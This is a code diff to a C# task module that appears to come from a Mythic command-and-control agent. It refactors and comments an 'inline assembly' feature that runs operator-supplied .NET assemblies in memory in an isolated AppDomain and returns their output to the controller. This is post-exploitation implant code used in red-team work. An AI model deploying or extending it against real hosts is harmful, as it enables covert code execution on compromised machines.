@@ -70,6 +70,15 @@ namespace Tasks
                 string accumOut = "";
                 string slicedOut = "";
                 int lastOutLen = 0;
+                /* Unfortunately, with the way the way Cross AppDomain delegates work,
+                 * we can't invoke functions on private members of the parent class.
+                 * Instead, we have to take the approach of managing concurrent access
+                 * with the agent's output mutex. So long as we have acquired the mutex,
+                 * we ensure we're the only one accessing the static _output variable.
+                 * Then each second, we see what "new" output has been posted by the cross
+                 * AppDomain delegate function. If there is new output, we take the segment
+                 * of the string that is new, and post it to Mythic.
+                 */
                 while (!_completed && !_cancellationToken.IsCancellationRequested)
                 {
                     WaitHandle.WaitAny(new WaitHandle[]
@@ -131,6 +140,80 @@ namespace Tasks
             }
         }
 
+        public override void Kill()
+        {
+            _completed = true;
+            _cancellationToken.Cancel();
+            Complete.Set();
+        }
+
+        public override System.Threading.Tasks.Task CreateTasking()
+        {
+            return new System.Threading.Tasks.Task(() =>
+            {
+                TaskResponse resp;
+                TextWriter realStdOut = Console.Out;
+                TextWriter realStdErr = Console.Error;
+                try
+                {
+                    /*
+                     * This output lock ensures that we're the only ones that are manipulating the static
+                     * variables of this class, such as:
+                     * - _output
+                     * - _completed
+                     * These variables communicate across the AppDomain boundary (as they're simple types).
+                     * Output is managed by the _sendTask.
+                     */
+                    _agent.AcquireOutputLock();
+                    
+                    InlineAssemblyParameters parameters = _jsonSerializer.Deserialize<InlineAssemblyParameters>(_data.Parameters);
+                    
+                    if (_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out byte[] assemblyBytes))
+                    {
+                        byte[] ByteData = assemblyBytes;
+                        string[] stringData = string.IsNullOrEmpty(parameters.AssemblyArguments) ? new string[0] : ParseCommandLine(parameters.AssemblyArguments);
+                        _sendTask =
+                            System.Threading.Tasks.Task.Factory.StartNew(_sendAction, _cancellationToken.Token);
+                        if (LoadAppDomainModule(stringData, ByteData))
+                        {
+                            resp = CreateTaskResponse("", true);
+                        }
+                        else
+                        {
+                            resp = CreateTaskResponse("Failed to load module.", true, "error");
+                        }
+                    }
+                    else
+                    {
+                        resp = CreateTaskResponse($"{parameters.AssemblyName} is not loaded (have you registered it?)", true);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
+                }
+                finally
+                {
+                    Console.Out.Flush();
+                    Console.Error.Flush();
+                    Console.SetOut(realStdOut);
+                    Console.SetError(realStdErr);
+                    _completed = true;
+                    Complete.Set();
+                    if (_sendTask != null)
+                    {
+                        _sendTask.Wait();   
+                    }
+
+                    _completed = false;
+                    _output = "";
+                    _agent.ReleaseOutputLock();
+                }
+                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+            }, _cancellationToken.Token);
+        }
+        
+#region AppDomain Management
         private bool LoadAppDomainModule(String[] sParams, Byte[] bMod)
         {
             AppDomain isolationDomain = AppDomain.CreateDomain(Guid.NewGuid().ToString());
@@ -191,7 +274,12 @@ namespace Tasks
             UnloadAppDomain(isolationDomain);
             return true;
         }
-
+        private static void UnloadAppDomain(AppDomain oDomain)
+        {
+            AppDomain.Unload(oDomain);
+        }
+#endregion
+#region Cross AppDomain Loader
         static void ActivateLoader()
         {
             string[] str = AppDomain.CurrentDomain.GetData("str") as string[];
@@ -224,76 +312,7 @@ namespace Tasks
                 }
             }
         }
-
-        private static void UnloadAppDomain(AppDomain oDomain)
-        {
-            AppDomain.Unload(oDomain);
-        }
-
-        public override void Kill()
-        {
-            _completed = true;
-            _cancellationToken.Cancel();
-            Complete.Set();
-        }
-
-        public override System.Threading.Tasks.Task CreateTasking()
-        {
-            return new System.Threading.Tasks.Task(() =>
-            {
-                TaskResponse resp;
-                TextWriter realStdOut = Console.Out;
-                TextWriter realStdErr = Console.Error;
-                try
-                {
-                    _agent.AcquireOutputLock();
-                    
-                    InlineAssemblyParameters parameters = _jsonSerializer.Deserialize<InlineAssemblyParameters>(_data.Parameters);
-                    
-                    if (_agent.GetFileManager().GetFileFromStore(parameters.AssemblyName, out byte[] assemblyBytes))
-                    {
-                        byte[] ByteData = assemblyBytes;
-                        string[] stringData = string.IsNullOrEmpty(parameters.AssemblyArguments) ? new string[0] : ParseCommandLine(parameters.AssemblyArguments);
-                        _sendTask =
-                            System.Threading.Tasks.Task.Factory.StartNew(_sendAction, _cancellationToken.Token);
-                        if (LoadAppDomainModule(stringData, ByteData))
-                        {
-                            resp = CreateTaskResponse("", true);
-                        }
-                        else
-                        {
-                            resp = CreateTaskResponse("Failed to load module.", true, "error");
-                        }
-                    }
-                    else
-                    {
-                        resp = CreateTaskResponse($"{parameters.AssemblyName} is not loaded (have you registered it?)", true);
-                    }
-                }
-                catch (Exception ex)
-                {
-                    resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
-                }
-                finally
-                {
-                    Console.Out.Flush();
-                    Console.Error.Flush();
-                    Console.SetOut(realStdOut);
-                    Console.SetError(realStdErr);
-                    _completed = true;
-                    Complete.Set();
-                    if (_sendTask != null)
-                    {
-                        _sendTask.Wait();   
-                    }
-
-                    _completed = false;
-                    _output = "";
-                    _agent.ReleaseOutputLock();
-                }
-                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-            }, _cancellationToken.Token);
-        }
+#endregion
     }
 }
 #endif
